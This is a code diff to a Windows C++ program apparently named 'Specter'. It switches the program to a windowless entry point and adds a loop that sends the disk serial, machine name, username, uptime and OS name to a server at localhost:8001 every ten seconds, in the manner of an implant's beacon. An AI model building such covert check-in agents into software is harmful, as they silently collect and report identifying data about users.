@@ -6,24 +6,41 @@
 #include "SpecterLib/UserInfo.h"
 #include "SpecterLib/SystemInfo.h"
 
-int main()
+// Attempts to attach to a console, but only if process is run under one.
+void TryToAttachConsole()
+{
+	if (!AttachConsole(ATTACH_PARENT_PROCESS))
+	{
+		return;
+	}
+
+	FILE* stream;
+	freopen_s(&stream, "CONOUT$", "w", stderr);
+	freopen_s(&stream, "CONOUT$", "w", stdout);
+	freopen_s(&stream, "CONIN$", "r", stdin);
+
+	std::cout << "Specter console-mode online" << std::endl;
+}
+
+int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
 {
 	try
 	{
-		ServerConnection connection;
+		TryToAttachConsole();
 
-		while(true)
+		ServerConnection connection("localhost", "8001");
+
+		while (true)
 		{
 			connection.syncInfog(SystemInfo::GetHdSerial(), UserInfo::GetMachineName(),
-								 UserInfo::GetUsername(), SystemInfo::GetUptime(), 
-								 SystemInfo::GetOsProductName());
+			                     UserInfo::GetUsername(), SystemInfo::GetUptime(),
+			                     SystemInfo::GetOsProductName());
 
 			std::this_thread::sleep_for(std::chrono::seconds(10));
 		}
 	}
 	catch (const std::exception& e)
 	{
-		std::cout << "Exception occurred: " << e.what() << std::endl;
+		std::cout << "Exception occurred: " << e.what() << '\n';
 	}
 }
-
